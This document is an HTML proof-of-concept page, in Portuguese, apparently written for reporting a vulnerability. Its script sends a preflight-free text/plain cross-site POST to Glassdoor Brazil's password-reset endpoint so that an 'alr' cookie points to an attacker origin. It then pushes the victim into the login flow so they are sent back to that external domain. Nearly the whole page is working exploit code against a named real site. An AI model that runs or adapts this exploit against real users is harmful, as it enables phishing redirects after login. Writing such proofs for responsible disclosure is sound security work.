<!doctype html>
<meta charset="utf-8">
<title>Glassdoor Redirect PoC</title>
<body>
<h2>PoC – Open Redirect via cookie <code>alr</code></h2>
<p>
Esta página (origem externa – GitHub Pages) envia um <b>POST sem preflight</b> para
<code>/auth/account/password/forgot/initiate</code>, fazendo o Glassdoor definir
<code>alr=&lt;referer desta página&gt;</code>. Em seguida, redireciona a vítima para uma
página do Glassdoor que inicia o fluxo de login. Após autenticar, o site deve consumir
o <code>alr</code> e redirecionar de volta para este domínio.
</p>

<pre id="log" style="background:#111;color:#eee;padding:10px;white-space:pre-wrap"></pre>

<script>
(function () {
  const nextPath = "/index.htm"; // tente também "/member/profile" se preferir
  const log = (m) => { const el = document.getElementById('log'); el.textContent += m + "\n"; };

  // cria iframe “sink” e form (text/plain) para evitar preflight CORS
  const iframe = document.createElement('iframe');
  iframe.name = 'sink';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  const form = document.createElement('form');
  form.action = 'https://www.glassdoor.com.br/auth/account/password/forgot/initiate';
  form.method = 'POST';
  form.enctype = 'text/plain';
  form.target = 'sink';

  const ta = document.createElement('textarea');
  ta.name = '';
  ta.value = JSON.stringify({ emailAddress: "victim@example.com" });
  form.appendChild(ta);
  document.body.appendChild(form);

  log("Enviando POST para setar cookie alr…");
  try { form.submit(); } catch(e){ log("Falha ao enviar form: "+e.message); }

  // pequeno delay para o Set-Cookie do alr chegar
  setTimeout(function(){
    log("Redirecionando para o fluxo do Glassdoor: " + nextPath);
    window.location.href = "https://www.glassdoor.com.br" + nextPath;
  }, 1200);
})();
</script>

<p style="font-size:12px;color:#666;margin-top:16px">
Use janela anônima. Antes do login, verifique em <b>Application → Cookies → https://www.glassdoor.com.br</b>
se o cookie <code>alr</code> aponta para seu GitHub Pages. Depois faça o login normal; se vulnerável,
você será redirecionado de volta ao seu domínio (ex.: <code>after-login.html</code>).
</p>
</body>
